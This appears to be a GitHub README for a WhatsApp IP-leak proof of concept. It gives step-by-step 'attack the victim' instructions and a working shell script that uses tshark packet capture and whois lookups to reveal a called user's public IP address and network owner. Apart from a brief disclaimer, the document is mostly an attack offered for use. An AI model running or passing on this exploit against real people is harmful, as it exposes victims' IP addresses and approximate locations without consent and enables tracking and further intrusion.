# whatsapp_hack
Leak Public IP from victim caller.

This program is for Educational purpose ONLY. Do not use it without permission. I am not responsible for any of your actions. Use this tool with caution.

## Attack the victim

- Step 1: Start WiFi hotspot on attacker machine and connect attacker phone to attacker SSID
- Step 2: Start the PoC script (below) on attacker machine which is now acting as a router for attacker phone
- Step 3: Call any whatsapp user randomly to capture the server IP addresses to filter
- Step 4: Call victim on his whatsapp
- Step 5: Disconnect the call once established
- Step 6: Script will reveal the public IP address of the target
- Step 7: Validate the public IP address on target phone

## Exploit

```
#!/bin/sh

filter=`tshark -i eth0 -T fields -f "udp" -e ip.dst -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" -c 100 |sort -u |xargs|sed "s/ / and ip.dst!=/g" |sed "s/^/ip.dst!=/g"`

echo "Press Enter and call your target."

read line

tshark -i eth0 -l -T fields -f "udp" -e ip.dst -Y "$filter" -Y "ip.dst!=192.168.0.0/16 and ip.dst!=10.0.0.0/8 and ip.dst!=172.16.0.0/12" | while read line 
do 
	whois $line > /tmp/b

	filter=`cat /tmp/b |xargs| egrep -iv "facebook|google"|wc -l`

	if [ "$filter" -gt 0 ] ; then 
		targetinfo=`cat /tmp/b| egrep -iw "OrgName:|NetName:|Country:"` 
		echo $line --- $targetinfo 
	fi 
done


```
## Credit

## [bhdresh](https://github.com/bhdresh)
